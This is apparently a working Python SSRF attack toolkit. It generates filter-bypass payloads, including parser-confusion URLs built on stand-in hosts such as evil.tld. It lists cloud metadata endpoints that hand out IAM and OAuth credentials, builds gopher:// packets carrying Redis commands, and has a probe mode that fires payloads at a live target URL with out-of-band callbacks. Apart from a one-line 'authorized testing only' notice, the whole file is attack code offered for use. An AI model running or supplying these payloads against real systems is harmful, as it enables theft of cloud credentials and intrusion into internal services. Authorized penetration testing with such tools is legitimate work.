#!/usr/bin/env python3
"""
ssrf_toolkit.py - SSRF payload generator + blind-SSRF callback probe (2024-2026).

Generates the modern SSRF bypass corpus (parser confusion, IPv6/decimal/octal
encodings, cloud metadata endpoints incl. IMDSv2 token flow, gopher/redis,
HTML-to-PDF meta-refresh switch) and can drive a live probe loop that fires
each payload at a vulnerable parameter and reports status/length deltas, or
emits OOB callbacks to a collaborator host.

Modes:
  payloads     print the full bypass corpus for a given internal target
  cloud        print provider metadata payloads (aws/gcp/azure/oracle/digitalocean)
  gopher       build a gopher:// Redis/SMTP packet (URL-encoded for SSRF)
  probe        fire payloads at a URL with FUZZ marker, report deltas (requires requests)

Dependency: pip install requests   (only for 'probe' mode; rest is stdlib)

Usage:
  python3 ssrf_toolkit.py payloads --target 169.254.169.254
  python3 ssrf_toolkit.py cloud --provider aws
  python3 ssrf_toolkit.py gopher --redis "FLUSHALL" --redis "SET x 1"
  python3 ssrf_toolkit.py probe "https://t/api/fetch?url=FUZZ" --collab abc.oast.fun

LEGAL: authorized testing only.
"""
import argparse
import sys
from urllib.parse import quote


def ip_encodings(ip="127.0.0.1"):
    # Works for 127.0.0.1 / 169.254.169.254 style targets
    octets = [int(o) for o in ip.split(".")] if ip.count(".") == 3 else None
    out = [ip]
    if octets:
        dec = (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]
        out += [
            str(dec),                                   # decimal
            "0x%08x" % dec,                             # hex
            "%d.%d.%d" % (octets[0], octets[1], (octets[2] << 8) + octets[3]),  # 3-part
            "0%o.0%o.0%o.0%o" % tuple(octets),          # octal
            "[::ffff:%s]" % ip,                         # ipv4-mapped ipv6
        ]
    return out


def bypass_payloads(target):
    enc = ip_encodings(target)
    payloads = []
    for host in enc:
        payloads.append(f"http://{host}/")
    # parser-confusion / SSRF filter bypass set
    payloads += [
        f"http://{target}.nip.io/",                       # DNS rebinding helper
        f"http://attacker.tld@{target}/",                 # userinfo confusion
        f"http://{target}#@evil.tld/",                    # fragment confusion
        f"http://evil.tld%2523@{target}/",               # double-encoded
        f"http://{target}\\@evil.tld/",                   # backslash confusion
        f"http:%2f%2f{target}%2f",                        # encoded slashes
        f"https://{target}/%2e%2e/",                      # dot-segment
        f"a" * 9000 + f"://{target}/",                    # long-scheme parser confusion (curl #1049624)
        f"http://[::1]/",                                  # ipv6 loopback
        f"file:///etc/passwd",                             # local file scheme
        f"http://localhost.{target}/",                     # subdomain trick
        f"http://0/",                                       # zero shorthand -> 0.0.0.0
        f"http://{target}:80\t/",                          # tab smuggling
    ]
    return payloads


CLOUD = {
    "aws": [
        # IMDSv1 (works only if v1 still enabled)
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE",
        "http://169.254.169.254/latest/user-data",
        # IMDSv2 requires a PUT to get a token then a header on GET; only exploitable
        # if SSRF can set custom headers / do PUT (e.g. via Axios gadget GHSA-fvcv-3m26-pcqx)
        "PUT http://169.254.169.254/latest/api/token  (X-aws-ec2-metadata-token-ttl-seconds: 21600)",
        "GET http://169.254.169.254/latest/meta-data/  (X-aws-ec2-metadata-token: <token>)",
        # ECS task role
        "http://169.254.170.2/v2/credentials/ (read $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token (Metadata-Flavor: Google)",
        "http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true (Metadata-Flavor: Google)",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id (Metadata-Flavor: Google)",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Metadata: true)",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ (Metadata: true)",
    ],
    "oracle": [
        "http://169.254.169.254/opc/v2/instance/ (Authorization: Bearer Oracle)",
        "http://169.254.169.254/opc/v2/identity/cert.pem (Authorization: Bearer Oracle)",
    ],
    "digitalocean": [
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/user-data",
    ],
}


def build_gopher_redis(commands, host="127.0.0.1", port=6379):
    # Build RESP/inline payload, gopher-encode it.
    payload = ""
    for cmd in commands:
        payload += cmd + "\r\n"
    encoded = quote(payload, safe="")
    encoded = encoded.replace("%0D%0A", "%0D%0A")  # keep CRLF
    return f"gopher://{host}:{port}/_{encoded}"


def cmd_payloads(args):
    print(f"[*] SSRF bypass corpus for internal target {args.target}\n")
    for p in bypass_payloads(args.target):
        print(p)
    print("\n[*] HTML-to-PDF / indirect protocol switch (CVE-2024-34112, CVE-2025-51591 class):")
    print('  <meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/meta-data/">')
    print('  <iframe src="http://169.254.169.254/latest/meta-data/"></iframe>')
    print('  <script>location="file:///etc/passwd"</script>')


def cmd_cloud(args):
    providers = [args.provider] if args.provider != "all" else list(CLOUD)
    for prov in providers:
        print(f"\n=== {prov.upper()} metadata ===")
        for p in CLOUD[prov]:
            print("  " + p)


def cmd_gopher(args):
    cmds = args.redis or ["INFO"]
    print(build_gopher_redis(cmds, host=args.host, port=args.port))


def cmd_probe(args):
    try:
        import requests
    except ImportError:
        sys.exit("pip install requests required for probe mode")
    if "FUZZ" not in args.url:
        sys.exit("url must contain the FUZZ marker")
    corpus = bypass_payloads(args.target)
    if args.collab:
        corpus.append(f"http://{args.collab}/ssrf-callback")
    sess = requests.Session()
    sess.verify = not args.insecure
    base = sess.get(args.url.replace("FUZZ", quote("http://example.invalid/", safe="")),
                    timeout=args.timeout)
    print(f"[*] baseline status={base.status_code} len={len(base.content)}\n")
    for p in corpus:
        try:
            r = sess.get(args.url.replace("FUZZ", quote(p, safe="")), timeout=args.timeout)
            delta = len(r.content) - len(base.content)
            flag = ""
            if r.status_code != base.status_code:
                flag += f" STATUS->{r.status_code}"
            if abs(delta) > 30:
                flag += f" LEN{delta:+d}"
            print(f"  {p[:60]:60} -> {r.status_code} len={len(r.content)}{flag}")
        except requests.exceptions.Timeout:
            print(f"  {p[:60]:60} -> TIMEOUT (possible blind SSRF / internal hang)")
        except Exception as e:
            print(f"  {p[:60]:60} -> err {e}")


def main():
    ap = argparse.ArgumentParser(description="SSRF toolkit (2024-2026)")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("payloads"); p.add_argument("--target", default="169.254.169.254")
    p.set_defaults(fn=cmd_payloads)

    p = sub.add_parser("cloud")
    p.add_argument("--provider", default="all", choices=list(CLOUD) + ["all"])
    p.set_defaults(fn=cmd_cloud)

    p = sub.add_parser("gopher")
    p.add_argument("--redis", action="append", help="Redis command (repeatable)")
    p.add_argument("--host", default="127.0.0.1"); p.add_argument("--port", type=int, default=6379)
    p.set_defaults(fn=cmd_gopher)

    p = sub.add_parser("probe")
    p.add_argument("url", help="URL containing FUZZ marker")
    p.add_argument("--target", default="169.254.169.254")
    p.add_argument("--collab", help="OOB collaborator host for blind SSRF")
    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--insecure", action="store_true")
    p.set_defaults(fn=cmd_probe)

    args = ap.parse_args()
    args.fn(args)


if __name__ == "__main__":
    main()
